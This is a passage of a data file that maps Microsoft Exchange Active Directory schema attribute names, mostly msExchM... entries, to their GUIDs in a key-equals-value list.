        "msExchInterOrgAddressType" = "3836c80b-8cee-4413-9e65-e937c1aed10f";
        "msExchInterruptUserOnAuditFailure" = "5b4151fc-81ef-4410-96b7-63e246199b47";
        "msExchIPAddress" = "8b46be1a-b09e-11d2-aa06-00c04f8eedd8";
        "msExchIpConfContainer" = "99f5866d-12e8-11d3-aa58-00c04f8eedd8";
        "msExchIPSecurity" = "a68fafa2-b093-11d2-aa06-00c04f8eedd8";
        "msExchIRMLogMaxAge" = "58587077-bfd5-4403-a0c9-f805de76317b";
        "msExchIRMLogMaxDirectorySize" = "f3fd7d90-09a8-4daf-afe7-01d3d64eafde";
        "msExchIRMLogMaxFileSize" = "38ad4684-4c10-42ef-a68d-cf944b4f5097";
        "msExchIRMLogPath" = "bb77fd45-1d98-4f0d-a7ac-c48167c066b4";
        "msExchIsBridgeheadSite" = "a6b1108e-b093-11d2-aa06-00c04f8eedd8";
        "msExchIsConfigCA" = "910f526c-b09e-11d2-aa06-00c04f8eedd8";
        "msExchIsMSODirsynced" = "994d56c6-a33d-470a-b768-3758c5877ec8";
        "msExchIsMSODirsyncEnabled" = "27569b03-d1f2-4047-94f6-63bdecb2c44a";
        "msExchJournalingReconciliationMailboxes" = "c5f39ff1-1e07-49ea-86d8-2055a54d2cf1";
        "msExchJournalingReconciliationPassword" = "c77280a5-fab2-47a2-8409-a7f4c118e0c6";
        "msExchJournalingReconciliationRemoteAccount" = "22997db3-740c-46f3-a17a-7b999b4043b6";
        "msExchJournalingReconciliationUrl" = "c76a1a8b-e9a7-499b-a459-ad853a2ee0c7";
        "msExchJournalingReconciliationUsername" = "42cd324f-3f8e-4c84-8284-2ff99ffa43ef";
        "msExchJournalingReportNDRTo" = "7b4fc83b-7b2a-4267-9aa2-b824dcf08fc3";
        "msExchJournalingRulesLink" = "b94635d2-1400-457d-849e-b480141b9f2b";
        "msExchKeyManagementServer" = "8ce334ec-b09e-11d2-aa06-00c04f8eedd8";
        "msExchLabeledURI" = "16775820-47f3-11d1-a9c3-0000f80367c1";
        "msExchLastAppliedRecipientFilter" = "b412b288-8c00-40bd-9b3a-3d6c19ed02e9";
        "msExchLastExchangeChangedTime" = "1f11a591-5b48-4d76-93d3-6621c62825f3";
        "msExchLastUpdateTime" = "d0020a05-a457-456f-9903-4a42b96cb53d";
        "msExchLegacyAccount" = "974c99e1-33fc-11d3-aa6e-00c04f8eedd8";
        "msExchLegacyDomain" = "974c99ea-33fc-11d3-aa6e-00c04f8eedd8";
        "msExchLegacyPW" = "974c99f2-33fc-11d3-aa6e-00c04f8eedd8";
        "msExchLegacyRedirectType" = "159e872e-0644-4b17-9317-c950015ffd08";
        "msExchLicenseToken" = "f8ba145a-51b5-48a8-a139-548c45e80df1";
        "msExchListPublic" = "a6f634c0-b093-11d2-aa06-00c04f8eedd8";
        "msExchLitigationHoldDate" = "c2a67603-16f8-48b7-a94a-751fe4a6afee";
        "msExchLitigationHoldOwner" = "90867967-2de1-4dd1-aada-80e925e72bcc";
        "msExchLoadBalancingSettings" = "4f43304a-2e38-4415-bc89-08999f4d9edc";
        "msExchLocalDomains" = "ab3a1ac7-1df5-11d3-aa5e-00c04f8eedd8";
        "msExchLocales" = "a738f698-b093-11d2-aa06-00c04f8eedd8";
        "msExchLocalName" = "a7153352-b093-11d2-aa06-00c04f8eedd8";
        "msExchLogonACL" = "7acf216d-1f42-48ec-b1bb-6ca281fe5b00";
        "msExchLogonMethod" = "8bcc41ca-b09e-11d2-aa06-00c04f8eedd8";
        "msExchLogType" = "a75a5784-b093-11d2-aa06-00c04f8eedd8";
        "msExchMailboxAuditEnable" = "04aba784-993b-4b62-add0-1d5c7a8a9b69";
        "msExchMailboxAuditLastAdminAccess" = "e4787107-231b-4462-a6d3-d9df8fa38b9a";
        "msExchMailboxAuditLastDelegateAccess" = "5fcc17da-d5f1-4aea-8414-26f116bec5d6";
        "msExchMailboxAuditLastExternalAccess" = "2071e804-24b3-4e8c-8701-c9aa90d917b2";
        "msExchMailboxAuditLogAgeLimit" = "c2e827a5-5c58-48c1-8138-fa34b64f05ad";
        "msExchMailboxFolderSet" = "d72941ba-ffd0-4d8e-bb85-97713440c8a3";
        "msExchMailboxFolderSet2" = "3042e38b-079f-4b29-a7c6-e17d64f76ce6";
        "msExchMailboxGuid" = "9333af48-b09e-11d2-aa06-00c04f8eedd8";
        "msExchMailboxManagerActivationSchedule" = "829122d7-25b1-4be6-a2e3-d8453c950938";
        "msExchMailboxManagerActivationStyle" = "9ea95949-7d74-49cd-af09-3db0870e535e";
        "msExchMailboxManagerAdminMode" = "9a6b371e-a3e7-4266-9b7b-2ce454336f90";
        "msExchMailboxManagerAgeLimit" = "cd63db2c-8aa9-4a14-941b-1b59fdcaafbd";
        "msExchMailboxManagerCustomMessage" = "8681f0bc-24d6-4d58-bc16-62f73cd5bedb";
        "msExchMailboxManagerFolderSettings" = "a57cf645-4b12-4ee4-a6eb-fce022068ffd";
        "msExchMailboxManagerKeepMessageClasses" = "0044d40c-6a24-4b57-abce-f555cc724c8e";
        "msExchMailboxManagerMode" = "9bd7499b-282b-4eb6-a40e-7d044d896741";
        "msExchMailboxManagerPolicy" = "36f94fcc-ebbb-4a32-b721-1cae42b2dbab";
        "msExchMailboxManagerReportRecipient" = "445791fb-e6fc-48dd-aad5-32e32c9059d9";
        "msExchMailboxManagerSendUserNotificationMail" = "d2888db3-2b0d-4d6a-831e-4efdfc036584";
        "msExchMailboxManagerSizeLimit" = "92d9302b-76bd-4156-95a1-f5b6a1463eb4";
        "msExchMailboxManagerSizeLimitEnabled" = "1563eae5-3ac1-4274-9e59-7d2fcc836f82";
        "msExchMailboxManagerUserMessageBody" = "9ec3ccac-09fa-4a22-869f-9144258d230d";
        "msExchMailboxManagerUserMessageFooter" = "33795abb-57ba-43ec-9f7e-a4601c2e4d4f";
        "msExchMailboxManagerUserMessageHeader" = "fbcffefe-8916-4ce6-ac76-eab226fe5440";
        "msExchMailboxMoveBatchName" = "3f39f7a4-a85e-4c8c-8c34-d96f61363b7c";
        "msExchMailboxMoveFilePath" = "ffdeef93-4405-4069-97e4-056d46530d44";
        "msExchMailboxMoveFlags" = "2dbd24ab-34bc-4f97-b9e3-775e3ad16397";
        "msExchMailboxMoveRemoteHostName" = "280660f0-c51a-48ab-81fc-b2767fd2eff8";
        "msExchMailboxMoveRequestGuid" = "278fdbfc-75f0-4422-b3c5-857df2f39e1b";
        "msExchMailboxMoveSourceArchiveMDBBL" = "9ae2495c-f760-4850-9b27-8c127b08b8b2";
        "msExchMailboxMoveSourceArchiveMDBLink" = "27dfb9c7-dcbb-4d87-b964-3b3ad4a89f19";
        "msExchMailboxMoveSourceMDBBL" = "7133dbde-f4a6-4d27-a3c1-df30bf2514e9";
        "msExchMailboxMoveSourceMDBLink" = "6dc65f1e-5321-4b96-870f-d1167db4a67e";
        "msExchMailboxMoveSourceUserBL" = "4c0c2715-1e41-430a-bfaa-b3a026807f03";
        "msExchMailboxMoveSourceUserLink" = "6ef64b87-f757-4b30-b3b4-dd103c0f448c";
        "msExchMailboxMoveStatus" = "7891fd5c-d12c-49ad-b05a-378928074a41";
        "msExchMailboxMoveStorageMDBBL" = "e6378541-d4d2-4863-b78f-6a596ee34470";
        "msExchMailboxMoveStorageMDBLink" = "7d73e3bb-f813-46da-a031-219217247185";
        "msExchMailboxMoveTargetArchiveMDBBL" = "64f03144-a9e9-498b-989e-c613bb95a50e";
        "msExchMailboxMoveTargetArchiveMDBLink" = "98343fff-d09a-428d-a321-e10b3bf4555a";
        "msExchMailboxMoveTargetMDBBL" = "9809e6da-4eb1-49fd-80df-d25c1534739d";
        "msExchMailboxMoveTargetMDBLink" = "31b926df-8942-40fa-9f92-901dab54d790";
        "msExchMailboxMoveTargetUserBL" = "1bace977-5432-44d5-b796-da0faf4fec8b";
        "msExchMailboxMoveTargetUserLink" = "29718946-469f-44a2-8693-7a1e328923c0";
        "msExchMailboxOABVirtualDirectoriesBL" = "f53cba52-5b04-48db-a27a-b69d1f8fa9d0";
        "msExchMailboxOABVirtualDirectoriesLink" = "30d266dc-5282-4128-aba8-b458e4672fa1";
        "msExchMailboxPlanType" = "c539d8f9-35c1-42bf-ab15-e9525c7dc206";
        "msExchMailboxRecipientTemplate" = "79532694-6170-4d79-8444-76b1d2e10389";
        "msExchMailboxRetentionPeriod" = "7b4a7a8a-1876-11d3-aa59-00c04f8eedd8";
        "msExchMailboxRoleFlags" = "791999f9-667a-4aca-9b48-305ac2d75cf5";
        "msExchMailboxSecurityDescriptor" = "934de926-b09e-11d2-aa06-00c04f8eedd8";
        "msExchMailboxTemplateBL" = "93cfe86d-c7d0-4108-b117-9cc72908ee6e";
        "msExchMailboxTemplateLink" = "e7629335-2b5f-4593-8656-85239a9c46f6";
        "msExchMailboxUrl" = "fc1ffd10-ae3f-466c-87c7-518b91dadbd0";
        "msExchMailGatewayFlags" = "e2885c16-2d7b-4312-bad3-ac86e4b2ddfc";
        "msExchMailStorage" = "03652000-a981-11d2-a9ff-00c04f8eedd8";
        "msExchMailTipsLargeAudienceThreshold" = "c1e75273-ee57-4fae-9f44-e9f47ef11a38";
        "msExchMailTipsSettings" = "85c229c6-1cb0-4bb8-bd3f-4291f68d31b5";
        "msExchMaintenanceSchedule" = "8fa76ef0-25d7-11d3-aa68-00c04f8eedd8";
        "msExchMaintenanceStyle" = "8fa76ef6-25d7-11d3-aa68-00c04f8eedd8";
        "msExchManagementConsoleFeedbackEnabled" = "c7fe586d-7d90-47b2-997f-2ad83e0cc355";
        "msExchManagementConsoleFeedbackURL" = "4c9c0c3f-a555-4b33-a640-af0d05075045";
        "msExchManagementConsoleHelpURL" = "2971e443-d57d-4c66-8cf9-953dd693b571";
        "msExchManagementSettings" = "8539606e-eb18-4ce9-87f3-11c209918688";
        "msExchManagementSiteLink" = "ba6ddcd7-a1d3-4421-b839-d0b8e4c8c700";
        "msExchMandatoryAttributes" = "e32977be-1d31-11d3-aa5e-00c04f8eedd8";
        "msExchMasterAccountHistory" = "e1af1477-39f6-4fa7-86c4-68decb302e2c";
        "msExchMasterAccountSid" = "936a855e-b09e-11d2-aa06-00c04f8eedd8";
        "msExchMasterServerOrAvailabilityGroup" = "4f0f2189-3fa1-4bc5-beda-b27b3252b5ce";
        "msExchMasterService" = "944d04c4-b09e-11d2-aa06-00c04f8eedd8";
        "msExchMasterServiceBL" = "946c0356-b09e-11d2-aa06-00c04f8eedd8";
        "msExchMaxActiveMailboxDatabases" = "0cfd895c-ff57-42e8-847e-fe66a439f57d";
        "msExchMaxBlockedSenders" = "d15ba867-0b2b-474c-8554-e7a3bcddcbc3";
        "msExchMaxCachedViews" = "1529cf69-2fdb-11d3-aa6d-00c04f8eedd8";
        "msExchMaxConnections" = "a7c33efc-b093-11d2-aa06-00c04f8eedd8";
        "msExchMaxDumpsterSizePerStorageGroup" = "0efa2537-cfba-4ee4-b2de-e47a1edc9942";
        "msExchMaxDumpsterTime" = "a3ff7a18-9c6d-4cc4-b92e-daf06e2c56dd";
        "msExchMaxExtensionTime" = "99f58668-12e8-11d3-aa58-00c04f8eedd8";
        "msExchMaximumRecurringInstances" = "a8b8d132-b093-11d2-aa06-00c04f8eedd8";
        "msExchMaximumRecurringInstancesMonths" = "a8da321e-b093-11d2-aa06-00c04f8eedd8";
        "msExchMaxIncomingConnections" = "a808632e-b093-11d2-aa06-00c04f8eedd8";
        "msExchMaxParticipants" = "99f58663-12e8-11d3-aa58-00c04f8eedd8";
        "msExchMaxPoolThreads" = "a82e88ce-b093-11d2-aa06-00c04f8eedd8";
        "msExchMaxRestoreStorageGroups" = "3ef2a80e-ea82-421b-8a62-a12543c34141";
        "msExchMaxSafeSenders" = "417ada0b-58f3-48e8-a283-9c9cd3c4b4b7";
        "msExchMaxSignupAddressesPerUser" = "59c728c7-d9f1-4c3b-a432-b75d9759ab19";
        "msExchMaxStorageGroups" = "a84fe9ba-b093-11d2-aa06-00c04f8eedd8";
        "msExchMaxStoresPerGroup" = "a8714aa6-b093-11d2-aa06-00c04f8eedd8";
        "msExchMaxStoresTotal" = "c638458c-e40b-43c2-96d7-6dbfa2fa3cf1";
        "msExchMaxThreads" = "a8950dec-b093-11d2-aa06-00c04f8eedd8";
        "msExchMCU" = "038680ec-a981-11d2-a9ff-00c04f8eedd8";
        "msExchMCUContainer" = "03aa4432-a981-11d2-a9ff-00c04f8eedd8";
        "msExchMCUHostsSites" = "bd062bc7-ce32-4690-8b8e-5c63b816b516";
        "msExchMCUHostsSitesBL" = "b0ab8d77-2486-467d-a331-3e3524438a57";
        "msExchMDB" = "03d069d2-a981-11d2-a9ff-00c04f8eedd8";
        "msExchMDBAvailabilityGroup" = "899c4769-8da3-4248-bd69-a680b876c4d7";
        "msExchMDBAvailabilityGroupBL" = "c7bdc626-f208-4004-858d-02293e11e6bb";
        "msExchMDBAvailabilityGroupContainer" = "3a7b0c31-b4e3-46be-a4d2-b843d16846f6";
        "msExchMDBAvailabilityGroupIPv4Addresses" = "e4efd7f0-23b2-42bf-a692-ec0de6302947";
        "msExchMDBAvailabilityGroupLink" = "94a07e78-ac31-44ba-8713-e6eeb209dee8";
        "msExchMDBAvailabilityGroupName" = "d25280df-5463-4104-84cf-790459eb53cd";
        "msExchMDBAvailabilityGroupNetworkSettings" = "bce4f595-1613-477e-9a50-4da5368811e5";
        "msExchMDBContainer" = "3573336c-92c4-4f5f-89b5-c369fe1e0285";
        "msExchMDBCopy" = "4e2a3f96-f552-4d78-921c-e2890089c25e";
        "msExchMDBCopyParentClass" = "4595eae9-bd01-4944-a952-b6657b2a8c1d";
        "msExchMDBName" = "cab4baa4-4c16-4436-b49f-af0d4fb7ef67";
        "msExchMDBRulesQuota" = "b04ebc2c-f0ea-425f-b367-85a56cfdee79";
        "msExchMemberBaseDN" = "a921b8aa-b093-11d2-aa06-00c04f8eedd8";
        "msExchMemberFilter" = "a9457bf0-b093-11d2-aa06-00c04f8eedd8";
        "msExchMessageClassification" = "a823c5e7-6bba-4d6c-802c-98756f2be468";
        "msExchMessageClassificationBanner" = "402585ca-a3ce-4515-9184-17f9f41c8582";
        "msExchMessageClassificationConfidentialityAction" = "78d10f2d-f9d1-4ce8-9dce-8abf63df3676";
        "msExchMessageClassificationDisplayPrecedence" = "f0be958e-d80f-4ec4-bd35-f836afac3f11";
        "msExchMessageClassificationFlags" = "0cd10eaf-df05-4e68-a619-f792215ada65";
        "msExchMessageClassificationID" = "5484dffc-f788-4a63-addf-ec7b9bc496d9";
        "msExchMessageClassificationIntegrityAction" = "2931b382-59cf-43d4-8e15-6398de9b2b67";
        "msExchMessageClassificationLocale" = "d3fedcfc-7975-4b31-b0b1-1005e1b27f37";
        "msExchMessageClassificationURL" = "c5915811-cd8c-46c0-b721-e1de18de5f11";
        "msExchMessageClassificationVersion" = "ce6819fd-7c75-44fa-b3ee-073cdefa8902";
        "msExchMessageDeliveryConfig" = "ab3a1ad7-1df5-11d3-aa5e-00c04f8eedd8";
        "msExchMessageHygieneBitmask" = "3deef1f9-6e2b-430b-bd88-4034086212fd";
        "msExchMessageHygieneBlockedDomain" = "e6efe991-5d0d-4940-bd85-a5f76c14a3e8";
        "msExchMessageHygieneBlockedDomainAndSubdomains" = "c7dfba1d-1a2f-4fe3-9b75-da4348f4e88c";
        "msExchMessageHygieneBlockedRecipient" = "02d3a8db-36aa-4330-8942-cfac2074c87b";
        "msExchMessageHygieneBlockedSender" = "23c20671-7480-42af-b7f3-ac5905736798";
        "msExchMessageHygieneBlockedSenderAction" = "868a133b-066e-447c-9044-284b0326d58e";
        "msExchMessageHygieneBypassedRecipient" = "a33bb655-543b-44af-a137-c6070e807959";
        "msExchMessageHygieneBypassedSenderDomain" = "861e2f06-a25e-4837-9507-6dd6f721dce1";
        "msExchMessageHygieneBypassedSenderDomains" = "66240c5b-3e49-421f-b4af-aad54c9bd3aa";
        "msExchMessageHygieneBypassedSenders" = "4abb7fe2-84f5-4c94-a3f2-1acc9bd6883a";
        "msExchMessageHygieneContentFilterConfig" = "b7850ff9-a975-4cc0-b358-b866293c42bc";
        "msExchMessageHygieneContentFilterLocation" = "da9b199d-0da7-405b-b464-af854cd17582";
        "msExchMessageHygieneCustomWeightEntry" = "28754b0e-b2a9-4914-9f70-6f29a04c0b78";
        "msExchMessageHygieneDelayHours" = "0214e331-2adc-4048-952d-5772bc7bc430";
        "msExchMessageHygieneFlags" = "398c04e2-147b-44eb-a97f-7c871d5dbb12";
        "msExchMessageHygieneIPAddress" = "5bc77ae9-cc06-4eb1-b434-d00c47fe8d53";
        "msExchMessageHygieneIPAllowListConfig" = "a287133a-054a-4e8a-8e2e-c209c95ea24b";
        "msExchMessageHygieneIPAllowListProvider" = "0a4e0d5a-ec87-4e80-8028-735ed0f7af4a";
        "msExchMessageHygieneIPAllowListProviderConfig" = "8ece3e9c-053b-4ea4-b503-1db0cc35fcd5";
        "msExchMessageHygieneIPBlockListConfig" = "3cf2e983-e82c-4d10-8d12-fdefa56c677d";
        "msExchMessageHygieneIPBlockListProvider" = "37865f31-ac7b-4585-a9be-24deb5181be4";
        "msExchMessageHygieneIPBlockListProviderConfig" = "f4fb3380-04bb-4288-b024-58a12f2a18bb";
        "msExchMessageHygieneLookupDomain" = "11085ae9-8c93-4bb1-be06-c1931551d59a";
        "msExchMessageHygieneMachineGeneratedRejectionResponse" = "e9f01fc0-3499-4110-92c6-0fa6d29b5b74";
        "msExchMessageHygienePriority" = "35813347-3f63-4a40-b2bf-4c3d5c057015";
        "msExchMessageHygieneProviderFlags" = "f1ce3119-1866-4a24-8584-9f0f3076094c";
        "msExchMessageHygieneProviderName" = "561ae3c6-f135-4151-8ab7-4da59a9df4f9";
        "msExchMessageHygieneQuarantineMailbox" = "ab765410-a129-48a9-8168-1ebd90a4f21b";
        "msExchMessageHygieneRecipientBlockedSenderAction" = "4378f4d6-ff12-490c-be03-d476da937a28";
        "msExchMessageHygieneRecipientFilterConfig" = "fe67dad2-d83b-488a-b320-28a33ce5540e";
        "msExchMessageHygieneRejectionMessage" = "8d21d446-2fdf-418c-b01b-56bd8272e013";
        "msExchMessageHygieneResultType" = "ca790288-afd8-4a78-b5e3-318660c2a95f";
        "msExchMessageHygieneSCLDeleteThreshold" = "7cf54b1d-026d-4e0f-85f0-2666bb908bdd";
        "msExchMessageHygieneSCLJunkThreshold" = "8f9187ef-5a12-42bf-8dde-53e37c70a4b2";
        "msExchMessageHygieneSCLQuarantineThreshold" = "a03e546f-2c9f-471e-b0a4-09152799597e";
        "msExchMessageHygieneSCLRejectThreshold" = "2d3f7c58-5e87-4d40-a519-958b1eaed8ef";
        "msExchMessageHygieneSenderFilterConfig" = "710841fd-db7b-47b5-89d9-f56e02011ca2";
        "msExchMessageHygieneSenderIDConfig" = "3019e5c5-2de3-4236-9ec2-85c2d21aeda0";
        "msExchMessageHygieneSpoofedDomainAction" = "37528820-d210-4087-9e14-0addb0f9a824";
        "msExchMessageHygieneStaticEntryRejectionResponse" = "6d7cff02-c24b-47d0-8ccc-b0bdb9778fff";
        "msExchMessageHygieneTempErrorAction" = "7c30c74f-b259-4e99-85ca-439f5990ed03";
        "msExchMessageJournalRecipient" = "a95fee9d-b634-41e9-8f8c-d3d9ac1d5941";
        "msExchMessageTrackLogFilter" = "a9647a82-b093-11d2-aa06-00c04f8eedd8";
        "msExchMetabasePath" = "31d51da3-95a9-4a2a-9f81-b2d977f9ca44";
        "msExchMigrationLogAgeQuotaInHours" = "febd81f0-12aa-4c57-a12b-0e8bcea50513";
        "msExchMigrationLogDirectorySizeQuota" = "982cfdbf-28f5-42cf-9629-f21860b30b90";
        "msExchMigrationLogDirectorySizeQuotaLarge" = "75c99029-3349-4e23-b716-d581cf2e9545";
        "msExchMigrationLogExtensionData" = "1cf811e2-939a-4a10-b3b9-22829866af29";
        "msExchMigrationLogLogFilePath" = "b3686988-e2ef-461f-8352-f10f39f6f584";
        "msExchMigrationLogLoggingLevel" = "d2e45d07-7d7f-49ab-b570-20b84c099b59";
        "msExchMigrationLogPerFileSizeQuota" = "5a165c23-0eea-47b0-af8a-6809f03f2b33";
        "msExchMimeTypes" = "8addd6a2-b09e-11d2-aa06-00c04f8eedd8";
        "msExchMinAdminVersion" = "8fca497d-4ac7-4df4-b180-eec0bfef27df";
        "msExchMinimumThreads" = "a9883dc8-b093-11d2-aa06-00c04f8eedd8";
        "msExchMinorPartnerId" = "693d97de-7f27-41f2-8dda-fd5942f0f253";
        "msExchMixedMode" = "8ddb297c-b09e-11d2-aa06-00c04f8eedd8";
        "msExchMLSDomainGatewaySMTPAddress" = "c6eb8202-949f-43bd-ba2f-c72f62311ca1";
        "msExchMLSEncryptedDecryptionP12Current" = "3a179935-9064-4071-b8fa-eb5a9245e5d6";
        "msExchMLSEncryptedDecryptionP12Previous" = "33e453df-823d-4ec0-9492-f0f66ca4bba1";
        "msExchMLSEncryptedRecoveryP12Current" = "b998e2b5-f30c-45c5-90f7-0d49e4f4eb82";
        "msExchMLSEncryptedRecoveryP12Previous" = "5dcb08f1-471a-4811-bbad-53dc63941d83";
        "msExchMLSEncryptedSigningP12Current" = "557ff252-4d61-4895-89f4-9525f61c27ff";
        "msExchMLSEncryptedSigningP12Previous" = "e2b0e009-d3b9-4eb5-bf74-37786db2519b";
        "msExchMobileAccessControl" = "593ad2a8-3413-40b7-a5db-da200b194211";
        "msExchMobileAdditionalFlags" = "e8c82719-0f63-4847-9d00-39436f781585";
        "msExchMobileAdminRecipients" = "81df7621-f697-4ba0-bc47-ac5b9e748ef8";
        "msExchMobileAllowBluetooth" = "057cbcae-359e-46c9-b1b8-38e8c7e37ba7";
        "msExchMobileAllowedDeviceIDs" = "1b9b1278-2f78-46a4-8a79-1793a16ff9ca";
        "msExchMobileAllowSMIMEEncryptionAlgorithmNegotiation" = "b50d2f99-4bb1-4efa-9a34-baab877e82ff";
        "msExchMobileApprovedApplicationList" = "a993ef32-e4df-48c9-9700-13ba274d5f31";
        "msExchMobileBlockedDeviceIDs" = "80549313-8d6c-423c-a077-6693fbeb1a2c";
        "msExchMobileClientCertificateAuthorityURL" = "a3431708-b922-45e6-bb4a-05560e5628bb";
        "msExchMobileClientCertTemplateName" = "1b7ab71f-45a1-4f33-96bf-6258afac658d";
        "msExchMobileClientFlags" = "2c2b3787-54c4-4bf0-b25e-ef8fb58be5d4";
        "msExchMobileDebugLogging" = "a8ed9a4a-21fe-452e-bd94-111735073003";
        "msExchMobileDefaultEmailTruncationSize" = "f93b950b-101e-4b1f-8555-9c42368837d8";
        "msExchMobileDeviceNumberOfPreviousPasswordsDisallowed" = "ee331649-c57b-4a5a-a92d-8e85fdf6c6f0";
        "msExchMobileDevicePasswordExpiration" = "f6a3edf2-a222-4c1f-8f7c-daa2d3b94c3b";
        "msExchMobileDevicePolicyRefreshInterval" = "9c9d9d13-bb0a-4a14-920d-3ad91855a19a";
        "msExchMobileFlags" = "65fa6b59-283d-4e1e-8ccf-2416e33c945b";
        "msExchMobileInitialMaxAttachmentSize" = "98cff6a5-30bb-474f-b4d1-df91aaaaed5e";
        "msExchMobileMailboxFlags" = "5430e777-c3ea-4024-902e-dde192204669";
        "msExchMobileMailboxPolicy" = "a29670e5-7e7d-4c51-8940-4b4563478746";
        "msExchMobileMailboxPolicyBL" = "a8ef7adc-b0a9-42a9-9c7b-e86d8f53fbfc";
        "msExchMobileMailboxPolicyLink" = "e6b5a02a-f581-4c42-ae60-108fe7c1edb5";
        "msExchMobileMailboxSettings" = "e6fabf91-1a22-4bf5-bf2e-0307f461c205";
        "msExchMobileMaxCalendarAgeFilter" = "d8e754f5-28fd-4899-a706-b9d6115e46d3";
        "msExchMobileMaxCalendarDays" = "73bd1ffb-fffe-4186-8fca-4a0c04fc1422";
        "msExchMobileMaxDevicePasswordFailedAttempts" = "11ba14e7-27fc-427c-98ee-e31cb30543b6";
        "msExchMobileMaxEmailAgeFilter" = "7ba83ea5-bccc-44a0-9f90-72622996cc6c";
        "msExchMobileMaxEmailBodyTruncationSize" = "27c6e524-e6bf-41d6-b02c-f8c6a7de28b1";
        "msExchMobileMaxEmailDays" = "addef618-51ce-4c7f-a2c6-03a8d3e694ad";
        "msExchMobileMaxEmailHTMLBodyTruncationSize" = "c21ae617-8d74-46de-afc3-a7e118134a57";
        "msExchMobileMaxInactivityTimeDeviceLock" = "f8087747-50f7-420e-8344-4ac4b703a564";
        "msExchMobileMinDevicePasswordComplexCharacters" = "6f675799-74ea-4aee-a830-ac8b8deb3dc5";
        "msExchMobileMinDevicePasswordLength" = "819fdb24-02d8-4ac0-87e4-bb06227490dc";
        "msExchMobileOTANotificationMailInsert" = "4f176187-4718-4ae2-aee2-2689012800e8";
        "msExchMobileOTANotificationMailInsert2" = "31d5cd9e-6ca6-42d4-8bc0-a5d401acd831";
        "msExchMobileOTAUpdateMode" = "ae25aaa9-e381-463e-bc80-810195ab3cdc";
        "msExchMobileOutboundCharset" = "1cdce4a0-1ab8-43a7-9d22-c1299e79bc9e";
        "msExchMobilePolicySalt" = "b2eb0a93-1266-4846-be62-dfb358681f1b";
        "msExchMobileRemoteDocumentsAllowedServers" = "de7efdd4-2137-4234-b802-32958b391e40";
        "msExchMobileRemoteDocumentsAllowedServersBL" = "615540b6-1297-4028-ae86-74039f3bc3ed";
        "msExchMobileRemoteDocumentsBlockedServers" = "5631e540-f332-48d1-9573-8bc2a476f18d";
        "msExchMobileRemoteDocumentsBlockedServersBL" = "2387fd23-725f-4914-97cd-0e610232e206";
        "msExchMobileRemoteDocumentsInternalDomainSuffixList" = "5a979350-0efc-400f-9222-fc438d177cec";
        "msExchMobileRemoteDocumentsInternalDomainSuffixListBL" = "ab44b62f-ef83-4d18-9c78-565275a6909d";
        "msExchMobileRequireEncryptionSMIMEAlgorithm" = "f32d4b0f-a9b8-4cd8-9a5c-a1a60b6effc8";
        "msExchMobileRequireSignedSMIMEAlgorithm" = "39c079c2-d84c-4a39-9fcd-e82aa58e69cb";
        "msExchMobileSettings" = "34fb73da-edcc-4491-b388-a62f62f4776e";
        "msExchMobileUnapprovedInROMApplicationList" = "1853b86f-bb32-48eb-95a7-4f4633959954";
        "msExchMobileUserMailInsert" = "9f281b9e-b306-4d9c-b061-c5852ee0698e";
        "msExchMobileVirtualDirectory" = "56ba85a5-ad5f-4f8a-b69c-039979afa366";
        "msExchModeratedByLink" = "e6e1c5e3-7582-43d0-9671-8718542a6c86";
        "msExchModeratedObjectsBL" = "ffe8a4b9-0456-40ee-b4af-41e8518390f0";
        "msExchModerationFlags" = "2f3e588b-63b7-49ee-a2c3-de8f681720fe";
        "msExchMonitoringDiskSpace" = "0210cc37-34cf-11d3-aa6e-00c04f8eedd8";
        "msExchMonitoringMode" = "e520be0a-d2ea-449b-9177-caaadec1a4c6";
        "msExchMonitoringMonitoredServices" = "0210cc30-34cf-11d3-aa6e-00c04f8eedd8";
        "msExchMonitoringNotificationRate" = "8bf11686-fb18-4147-95e4-f43f8c9de87d";
        "msExchMonitoringPollingRate" = "a3af17a5-b2bf-442c-bd04-83dcedb19ea4";
        "msExchMonitoringQueuePollingFrequency" = "501b8818-29ae-11d3-aa69-00c04f8eedd8";
        "msExchMonitoringQueuePollingInterval" = "501b880f-29ae-11d3-aa69-00c04f8eedd8";
        "msExchMonitoringResources" = "c1293ac0-b228-4b41-9409-2ca7d0c19459";
        "msExchMonitoringResponses" = "0210cc43-34cf-11d3-aa6e-00c04f8eedd8";
        "msExchMonitorsContainer" = "03f68f72-a981-11d2-a9ff-00c04f8eedd8";
        "msExchMoveToLSA" = "ab4cc53c-4ba4-11d3-aa75-00c04f8eedd8";
        "msExchMRSProxyFlags" = "362a01ef-11cb-4f91-b358-fb9f6b32c9fd";
        "msExchMRSProxyMaxConnections" = "b0f251b9-de7b-476a-b125-b00f6e8d7b85";
        "msExchMRSRequest" = "e09bc177-5bd4-4ed0-b7a9-b8ceab904668";
        "msExchMRSRequestType" = "8119b2c8-1c2a-45bf-80d3-db77259a08a2";
        "msExchMSMCertPolicyOid" = "985cfffa-42fa-4371-aa9f-0214f7b9d2ba";
        "msExchMSOForwardSyncAsyncOperationIds" = "749bddd7-7eca-41b0-83e1-865fcbe4ea6f";
        "msExchMSOForwardSyncNonRecipientCookie" = "14cf682a-e941-487a-9ca2-b2ade756bba3";
        "msExchMSOForwardSyncRecipientCookie" = "ed42651f-ed0c-49ed-ab89-2d1b6a26e80e";
        "msExchMSOForwardSyncReplayList" = "7165f303-5869-4e1b-a9c5-e5222968c741";
        "msExchMTADatabasePath" = "2f2dc2a4-242e-11d3-aa66-00c04f8eedd8";
        "msExchMultiMediaUser" = "1529cf7a-2fdb-11d3-aa6d-00c04f8eedd8";
        "msExchNonAuthoritativeDomains" = "ef2c7c70-f874-4280-8643-2334f2d3340c";
        "msExchNonMIMECharacterSet" = "974c99fe-33fc-11d3-aa6e-00c04f8eedd8";
        "msExchNoPFConnection" = "9ff15c41-1ec9-11d3-aa5e-00c04f8eedd8";
        "msExchNotesConnector" = "04c85e62-a981-11d2-a9ff-00c04f8eedd8";
        "msExchNotesConnectorMailbox" = "aa5a0cb8-b093-11d2-aa06-00c04f8eedd8";
        "msExchNotesExcludeGroups" = "0c74acba-b098-11d2-aa06-00c04f8eedd8";
        "msExchNotesExportGroups" = "0eb5a5ce-b098-11d2-aa06-00c04f8eedd8";
        "msExchNotesForeignDomain" = "137332c0-b098-11d2-aa06-00c04f8eedd8";
        "msExchNotesLetterhead" = "141552a8-b098-11d2-aa06-00c04f8eedd8";
        "msExchNotesNotesINI" = "13d02e76-b098-11d2-aa06-00c04f8eedd8";
        "msExchNotesNotesLinks" = "aa7dcffe-b093-11d2-aa06-00c04f8eedd8";
